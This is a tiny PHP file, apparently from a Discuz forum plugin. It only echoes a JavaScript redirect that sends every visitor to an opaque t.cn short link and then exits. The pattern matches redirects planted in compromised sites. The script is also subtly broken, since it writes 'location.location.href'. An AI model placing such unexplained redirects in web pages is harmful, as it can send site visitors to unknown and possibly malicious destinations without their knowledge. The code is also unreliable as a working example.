<?php
 
if(!defined('IN_DISCUZ')) {
    exit('Access Denied');
}

echo '<script type="text/javascript">location.location.href=\'http://t.cn/Aiux14ti\';</script>';
exit;